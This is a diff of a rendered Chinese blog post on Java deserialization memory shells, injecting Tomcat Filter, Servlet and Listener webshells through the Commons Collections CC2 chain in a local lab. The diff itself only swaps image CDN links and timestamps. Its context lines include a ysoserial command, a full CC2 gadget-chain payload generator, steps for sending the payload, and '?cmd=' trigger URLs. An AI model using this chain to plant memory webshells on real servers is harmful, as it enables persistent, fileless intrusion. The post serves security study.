@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-04-21T15:30:00.000Z">
-<meta property="article:modified_time" content="2026-04-21T14:39:04.855Z">
+<meta property="article:modified_time" content="2026-05-14T10:03:45.633Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -69,7 +69,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp2fxa24">
+  <link rel="stylesheet" href="/css/main.css?v=mp5bt8k3">
 
 
   
@@ -78,7 +78,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-21T23:30:00+08:00","dateModified":"2026-04-21T22:39:04+08:00","datePublished":"2026-04-21T23:30:00+08:00","description":"","headline":"原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/b8e2f4a1/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/b8e2f4a1/","keywords":"代码审计, Java, 反序列化, CC链, Tomcat, 内存马","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/ogIyfADuwNCAhF9ToazaYACAgED4C3oIAAeDE7~tplv-dy-aweme-images-ds-rs-v1_1918_1034_q80.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-21T23:30:00+08:00","dateModified":"2026-05-14T18:03:45+08:00","datePublished":"2026-04-21T23:30:00+08:00","description":"","headline":"原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/b8e2f4a1/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/b8e2f4a1/","keywords":"代码审计, Java, 反序列化, CC链, Tomcat, 内存马","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/ogIyfADuwNCAhF9ToazaYACAgED4C3oIAAeDE7~tplv-dy-aweme-images-ds-rs-v1_1918_1034_q80.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -221,14 +221,14 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.catalina.filters.SetCharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><code>http://localhost:8080/</code> 的效果：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421104934589.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421104934589.png"></p>
 <h3 id="验证漏洞入口是否正常"><a href="#验证漏洞入口是否正常" class="headerlink" title="验证漏洞入口是否正常"></a>验证漏洞入口是否正常</h3><p>因为环境是 CC 4.0，CC1 &#x2F; CC6 用不了（依赖 CC 3.x），这里用 CC2 来验证。</p>
 <p>直接用 <code>java -jar ysoserial.jar CommonsCollections2 &quot;calc&quot;</code> 生成 Payload，或者用 GUI 工具生成：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421105624407.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421105624407.png"></p>
 <p>上传数据提交：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421105901539.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421105901539.png"></p>
 <p>两种方式都能触发计算器弹出，漏洞入口没问题：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421105922043.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421105922043.png"></p>
 <hr>
 <h2 id="注入流程拆解"><a href="#注入流程拆解" class="headerlink" title="注入流程拆解"></a>注入流程拆解</h2><h3 id="利用链的选择逻辑"><a href="#利用链的选择逻辑" class="headerlink" title="利用链的选择逻辑"></a>利用链的选择逻辑</h3><p>要通过利用链注入内存马，关键问题只有一个：<strong>利用链的终点能不能执行任意 Java 字节码</strong>。</p>
 <p>根据这个可以把利用链分成两类：</p>
@@ -273,29 +273,29 @@
 <blockquote>
 <p><code>yv66vg</code> 是 Java 字节码文件魔数 <code>CA FE BA BE</code> 的 Base64 编码结果。所以看到一段 Base64 字符串开头是 <code>yv66vg</code>，基本可以确定这是一个 Java <code>.class</code> 文件编码后的结果。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421135920028.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421135920028.png"></p>
 <p>把 EvilFilter 的 Base64 字符串填进 <code>MemShellInject</code> 里的 <code>b64</code> 变量，重新编译，再次运行 GetBytes 拿到 <code>MemShellInject</code> 的字节数组：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421141517599.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421141517599.png"></p>
 <p>输出的字节数组开头是 <code>-54, -2, -70, -66</code>，对应的就是 <code>CA FE BA BE</code>，Java 字节码的魔数，没问题。</p>
 <hr>
 <h3 id="Step4：套入利用链生成-Payload"><a href="#Step4：套入利用链生成-Payload" class="headerlink" title="Step4：套入利用链生成 Payload"></a>Step4：套入利用链生成 Payload</h3><p>以 CC2 链为例，核心结构是 <code>PriorityQueue → TransformingComparator → InvokerTransformer → TemplatesImpl</code>。把 <code>MemShellInject</code> 的字节码填入 <code>TemplatesImpl._bytecodes</code>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 填入 MemShellInject 的字节数组（把 Step3 拿到的数组填进来）</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = &#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="comment">/* ... */</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把内存马字节码塞进 TemplatesImpl</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 CC2 链</span></span><br><span class="line">        <span class="comment">// 先用无害的 ConstantTransformer 占位，防止 add 的时候提前触发</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 塞完再换成真正的 InvokerTransformer，触发 newTransformer()</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;transformer&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化输出 bin 文件 + Base64</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos)) &#123;</span><br><span class="line">            oos.writeObject(queue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] payload = baos.toByteArray();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;memshell.bin&quot;</span>)) &#123;</span><br><span class="line">            fos.write(payload);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(payload));</span><br><span class="line">        System.out.println(<span class="string">&quot;memshell.bin 生成完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行后生成序列化的 Base64 数据：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142104451.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421142104451.png"></p>
 <hr>
 <h3 id="Step5：发送到目标触发注入"><a href="#Step5：发送到目标触发注入" class="headerlink" title="Step5：发送到目标触发注入"></a>Step5：发送到目标触发注入</h3><p><strong>文件上传型漏洞</strong>：直接上传 <code>memshell.bin</code> 文件到漏洞接口。</p>
 <p><strong>参数型漏洞</strong>：把 Base64 字符串粘进表单提交。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142221782.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421142221782.png"></p>
 <p>有报错提示不管，这是正常的，因为 <code>TemplatesImpl</code> 实例化我们的恶意类时会抛 <code>ClassCastException</code>，但构造函数在报错之前已经执行完了，内存马已经注入进去了。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142245584.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421142245584.png"></p>
 <p>直接访问：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/项目名/任意路径?cmd=calc</span><br></pre></td></tr></table></figure>
 
 <p>成功弹出计算器：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421140833022.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421140833022.png"></p>
 <p>重启 Tomcat 服务再次访问显示 404，证明刚才生效的是内存马，不是文件落地的 WebShell：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421142434611.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421142434611.png"></p>
 <hr>
 <h3 id="关于匿名内部类的替代写法"><a href="#关于匿名内部类的替代写法" class="headerlink" title="关于匿名内部类的替代写法"></a>关于匿名内部类的替代写法</h3><p>上面的方式是单独写一个 <code>EvilFilter.java</code>，编译后转 Base64 填进 <code>MemShellInject</code>，然后通过 <code>defineClass</code> 加载。</p>
 <p>还有另一种更简洁的写法：<strong>直接在 <code>MemShellInject</code> 里写内部匿名类</strong>，不需要 Base64 和 <code>defineClass</code> 那一套：</p>
@@ -314,13 +314,13 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(<span class="string">&quot;AbstractTranslet&quot;</span>)) &#123;</span><br><span class="line">    transletIndex = i; <span class="comment">// 记录下标</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>会根据 <code>AbstractTranslet</code> 来确定下标，在 <code>getTransletInstance()</code> 里用 <code>_class[_transletIndex].newInstance()</code> 来实例化。这意味着无论 <code>_class[]</code> 里有多少内部匿名类，被实例化的只有继承了 <code>AbstractTranslet</code> 的那个类。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421175444422.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421175444422.png"></p>
 <p>所以传入 <code>&#123;injectBytes, innerBytes&#125;</code> 也能正确实例化 <code>MemShellInject</code>，接着 <code>MemShellInject</code> 再触发 <code>MemShellInject$1</code> 的实例化，逻辑上没问题。</p>
 <p>但如果 <code>_bytecodes</code> 里有多个继承 <code>AbstractTranslet</code> 的类，<code>transletIndex</code> 会被后面的覆盖，最终只实例化最后一个。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 A 和 B 都继承了 AbstractTranslet</span></span><br><span class="line"><span class="comment">// 遍历顺序：A → B</span></span><br><span class="line"><span class="comment">// transletIndex 先指向 A，再被 B 覆盖，最终实例化 B</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;A, B&#125;); <span class="comment">// 最终实例化的是 B</span></span><br></pre></td></tr></table></figure>
 
 <p>不过实际注入场景里一般不会有这个问题，因为注入器只需要一个主类，匿名内部类继承的是功能类（<code>HttpServlet</code>、<code>Filter</code> 等），不会继承 <code>AbstractTranslet</code>。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421175714544.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421175714544.png"></p>
 <hr>
 <h2 id="Filter-内存马注入实现"><a href="#Filter-内存马注入实现" class="headerlink" title="Filter 内存马注入实现"></a>Filter 内存马注入实现</h2><p>上面的 Step1 ～ Step5 整个流程就是 Filter 内存马的完整实现，这里不重复了。核心是：</p>
 <ul>
@@ -345,7 +345,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/api/test?cmd=calc</span><br></pre></td></tr></table></figure>
 
 <p>成功：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421183807857.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421183807857.png"></p>
 <hr>
 <h2 id="Listener-内存马注入实现"><a href="#Listener-内存马注入实现" class="headerlink" title="Listener 内存马注入实现"></a>Listener 内存马注入实现</h2><p>Listener（监听器）是三种里最隐蔽的——它不出现在 FilterChain 里，也没有 URL 映射，纯粹靠事件驱动。</p>
 <p>Listener 拿 response 有一点麻烦，因为 <code>ServletRequestEvent</code> 里只能直接拿到 <code>ServletRequest</code>，response 需要两层反射来挖：</p>
@@ -354,7 +354,7 @@
 <p>注入成功后，任意路径带 <code>cmd</code> 参数即可触发，和 Filter 马效果一样：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/任意路径/?cmd=calc</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260421201728530.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260421201728530.png"></p>
 <hr>
 <h2 id="常见问题踩坑"><a href="#常见问题踩坑" class="headerlink" title="常见问题踩坑"></a>常见问题踩坑</h2><p><strong>1. <code>ClassCastException: cannot cast to ParallelWebappClassLoader</code></strong></p>
 <p>不同版本 Tomcat 的类加载器类名不一样，有时候是 <code>WebappClassLoader</code>，有时候是 <code>ParallelWebappClassLoader</code>。建议不要写死强转，改用 <code>instanceof</code> 判断，或者按父类 <code>WebappClassLoaderBase</code> 来操作，兼容性会好很多。</p>
@@ -859,7 +859,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp2fxa2a" defer></script>
+<script src="/js/main.js?v=mp5bt8k9" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1123,7 +1123,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp2fxa2b"></script>
+<script src="/js/plugins/achievements.js?v=mp5bt8ka"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
